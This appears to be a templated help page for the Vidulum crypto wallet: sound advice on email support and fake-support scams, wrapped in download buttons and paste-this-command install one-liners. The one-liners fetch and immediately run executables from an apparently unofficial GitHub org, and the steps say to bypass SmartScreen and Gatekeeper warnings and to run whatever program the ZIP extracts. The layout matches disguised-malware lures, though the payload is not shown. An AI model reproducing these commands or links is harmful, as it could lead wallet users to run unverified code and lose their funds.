![Vidulum](../assets/banner-article.png)

# Vidulum Support: Email Channels and What They Cannot Do

How to reach a human, what to send them, and the four things no one can fix.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

Work through the [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) before writing in, because most questions resolve there.

> No support channel will ever ask for your recovery phrase. If one does, it is not support.

Vidulum support runs on email; the address is published on the project's own site rather than repeated here, where it could go stale. What support can do is read a report, explain what happened and tell you which check to run next. What it cannot do is anything that requires your keys, because it does not have them.

<!-- ARTICLE-BODY-BEGIN -->

## The channel

Email is the documented route. There is no phone line, no live chat and no ticket portal described in the material behind this page, so treat an offer of any of those as unverified until you find it on the project's own property.

The practical consequence: one well-formed email beats five one-line messages. Support cannot see your screen, so what you write is the entire evidence base.

## What support cannot do

| Request | Why it cannot be done |
| --- | --- |
| Recover a lost phrase | Keys are local; nobody holds a copy |
| Reverse a transaction | Chains do not support reversal |
| Move coins for you | That requires your keys |
| Reset a password remotely | There is no hosted account |
| Unlock a wallet you cannot open | Same reason as the first row |

None of these are policy choices. They are properties of self-custody, and a channel that claims otherwise is either confused or hostile.

## What to include in a report

1. The platform and the release you are running.
2. The network and the asset involved.
3. The exact error text, copied rather than paraphrased.
4. The transaction identifier, if one exists, and the explorer link you checked.
5. What you already tried, and what changed.
6. Screenshots with no phrase, key or password visible.

That list lets someone reproduce the state you are in. Without it, the first reply is always a request for the same six facts.

## Recognising fake support

- Contact initiated by someone else, in a group or a direct message.
- An offer to "validate" or "sync" your wallet.
- A request to share your screen while you restore.
- A link to a support portal that asks for your phrase.
- Urgency, deadlines and threats about losing access.

Real support waits for you to contact it. Every scam above depends on reaching you first.

A failed send is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md">Vidulum Wallet send error checks</a>, which runs the four checks in order.

## If you get no reply

Response times are reported inconsistently, and this page cannot promise one. What helps is a follow-up that adds information rather than repeating the original message: the transaction identifier, a fresh attempt with the current release, or the result of the check you were asked to run.

If email genuinely fails, that is worth recording and reporting as a product problem rather than an individual one.

A chain problem is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-network-disconnected-check-chain.md">Vidulum network disconnected check</a>, which starts with the two-chain test.

If you cannot get in at all, <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-login-credentials-and-recovery.md">Vidulum Wallet login credentials</a> explains what a reset can and cannot do.

Include the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> you are running in any report.

## FAQ

### What is the support email address?

It is published on the project's own site. This page does not repeat it, so that a changed address cannot leave a stale copy here.

### Will support ask for my phrase?

Never. Any request for it is impersonation.

### Can support speed up a stuck transaction?

No. Once broadcast, a transaction is in the network's hands.

### What if my problem is urgent?

There is no priority channel documented. Send a complete report; completeness is what gets a useful reply.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[Send error checks](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md) - [Network disconnected checks](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-network-disconnected-check-chain.md) - [Wallet login](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-login-credentials-and-recovery.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
